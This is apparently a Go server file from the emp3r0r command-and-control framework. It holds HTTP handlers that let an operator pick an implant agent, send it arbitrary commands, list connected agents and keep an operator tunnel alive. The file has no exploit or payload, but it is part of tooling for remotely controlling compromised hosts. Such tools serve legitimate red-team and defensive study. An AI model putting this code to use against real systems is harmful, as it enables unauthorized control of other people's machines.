package server

import (
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/posener/h2conn"
)

// represents an operator_t
type operator_t struct {
	sessionID string       // marks the operator session
	conn      *h2conn.Conn // message tunnel, used to relay messages
}

var (
	// OPERATORS holds all operator connections
	OPERATORS = make(map[string]*operator_t)

	// SERVER_WG_CONFIG is the wireguard config for the server
	SERVER_WG_CONFIG *netutil.WireGuardConfig
)

// DecodeCBORBody decodes CBOR HTTP request body
func DecodeCBORBody[T any](wrt http.ResponseWriter, req *http.Request) (*T, error) {
	var dst T
	if err := cbor.NewDecoder(req.Body).Decode(&dst); err != nil {
		http.Error(wrt, err.Error(), http.StatusBadRequest)
		return nil, err
	}
	return &dst, nil
}

func handleSetActiveAgent(wrt http.ResponseWriter, req *http.Request) {
	// Decode CBOR request body
	operation, err := DecodeCBORBody[def.Operation](wrt, req)
	if err != nil {
		return
	}

	// Set active agent
	agents.SetActiveAgent(operation.AgentTag)

	// Return active agent
	wrt.Header().Set("Content-Type", "application/cbor")
	if err := cbor.NewEncoder(wrt).Encode(live.ActiveAgent); err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
	}
}

func handleSendCommand(wrt http.ResponseWriter, req *http.Request) {
	// Decode CBOR request body
	operation, err := DecodeCBORBody[def.Operation](wrt, req)
	if err != nil {
		return
	}

	// Get agent
	agent := agents.GetAgentByTag(operation.AgentTag)
	if agent == nil {
		http.Error(wrt, "Agent not found", http.StatusNotFound)
		return
	}

	// Get command and job ID
	if !operation.IsOptionSet("command") || !operation.IsOptionSet("job_id") {
		http.Error(wrt, "Command or JobID is empty", http.StatusBadRequest)
		return
	}

	// Send command to agent
	err = agents.SendCmd(*operation.Command, *operation.JobID, agent)
	if err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
		return
	}
	wrt.WriteHeader(http.StatusOK)
}

func handleListAgents(wrt http.ResponseWriter, _ *http.Request) {
	// Get all agents
	agentsList := agents.GetConnectedAgents()

	wrt.Header().Set("Content-Type", "application/cbor")
	if err := cbor.NewEncoder(wrt).Encode(agentsList); err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
	}
}

// handleOperatorConn handles operator connections, this connection will be used to relay the message tunnel
func handleOperatorConn(wrt http.ResponseWriter, req *http.Request) {
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	operator_session := req.Header.Get("operator_session")

	// Check if other operators are already connected
	activeSessionCount := len(OPERATORS)
	if activeSessionCount > 0 {
		logging.Warningf("⚠️  New operator %s connecting while %d session(s) active!", operator_session, activeSessionCount)

		// Construct a warning message
		warningMsg := def.MsgTunData{
			Tag: "ERROR", // "ERROR" tag triggers red text in your UI
			Response: []byte(fmt.Sprintf(
				"\n\n⛔  ERROR: %d other operator session(s) are currently active!\n"+
					"   Concurrent usage is PROHIBITED to prevent state corruption.\n"+
					"   Closing connection... Please retry when the other session is closed.\n", activeSessionCount)),
		}

		// Send the warning immediately upon connection
		encoder := cbor.NewEncoder(conn)
		if err := encoder.Encode(warningMsg); err != nil {
			logging.Errorf("Failed to send concurrency warning: %v", err)
		}
		time.Sleep(100 * time.Millisecond) // Ensure the message is sent
		conn.Close()
		return
	}
	logging.Infof("Operator %s connected to message tunnel from %s", operator_session, req.RemoteAddr)
	operator, ok := OPERATORS[operator_session]
	if !ok {
		OPERATORS[operator_session] = &operator_t{
			sessionID: operator_session,
			conn:      conn,
		}
	} else {
		operator.conn = conn
	}

	ctx, cancel := context.WithCancel(req.Context())
	defer func() {
		logging.Debugf("handleOperatorConn exiting")
		delete(OPERATORS, operator_session)

		// If this was the last operator, disconnect all agents
		if len(OPERATORS) == 0 {
			logging.Infof("Last operator disconnected, closing all agent connections")
			agents.DisconnectAllAgents()
		}

		_ = conn.Close()
		cancel()
	}()

	// Create a ticker to send heartbeat messages
	heartbeatTicker := time.NewTicker(1 * time.Second)
	defer heartbeatTicker.Stop()

	// Create a timeout timer for 1 minute (60 seconds)
	timeoutTimer := time.NewTimer(1 * time.Minute)
	defer timeoutTimer.Stop()

	// Channel to track the latest heartbeat
	heartbeatCh := make(chan struct{})

	// receiving heartbeats from the operator
	for {
		select {
		case <-heartbeatTicker.C:
			// If no heartbeat received in the last minute, close the connection
			if !timeoutTimer.Stop() {
				<-timeoutTimer.C
				logging.Warningf("Operator %s heartbeat timeout, closing connection", operator_session)
				conn.Close()
				cancel()
				return
			}
			// Reset the timeout timer after receiving a heartbeat
			timeoutTimer.Reset(1 * time.Minute)
		case <-heartbeatCh:
			// Heartbeat received, reset the timeout
			timeoutTimer.Reset(1 * time.Minute)
		case <-ctx.Done():
			logging.Warningf("handleOperatorConn exited")
			return
		}
	}
}
